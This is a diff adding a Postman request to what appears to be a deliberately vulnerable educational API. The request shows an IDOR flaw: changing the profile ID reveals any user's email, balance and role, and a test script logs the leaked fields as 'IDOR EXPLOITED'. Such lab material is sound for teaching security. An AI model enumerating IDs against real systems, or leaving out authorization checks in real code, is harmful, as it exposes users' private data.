@@ -155,6 +155,43 @@
 						},
 						"description": "Actualiza username y/o email del usuario"
 					}
+				},
+				{
+					"name": "Get Profile By ID (IDOR)",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"if (pm.response.code === 200) {",
+									"    var jsonData = pm.response.json();",
+									"    console.log(\"⚠️ IDOR EXPLOITED: Accessed profile of user \" + jsonData.id);",
+									"    console.log(\"Username: \" + jsonData.username);",
+									"    console.log(\"Email: \" + jsonData.email);",
+									"    console.log(\"Balance: $\" + jsonData.balance);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/user/profile/:id",
+							"host": ["{{base_url}}"],
+							"path": ["api", "user", "profile", ":id"],
+							"variable": [
+								{
+									"key": "id",
+									"value": "1",
+									"description": "ID del usuario a consultar (cambia este valor para explotar IDOR)"
+								}
+							]
+						},
+						"description": "⚠️ VULNERABLE - IDOR: Permite ver el perfil de CUALQUIER usuario cambiando el parámetro ID. No hay verificación de autorización.\n\nPara explotar: Cambia el parámetro :id a diferentes valores (1, 2, 3, etc.) para enumerar todos los usuarios y ver sus emails, balances y roles.\n\nEsto es intencional para fines educativos."
+					}
 				}
 			]
 		},
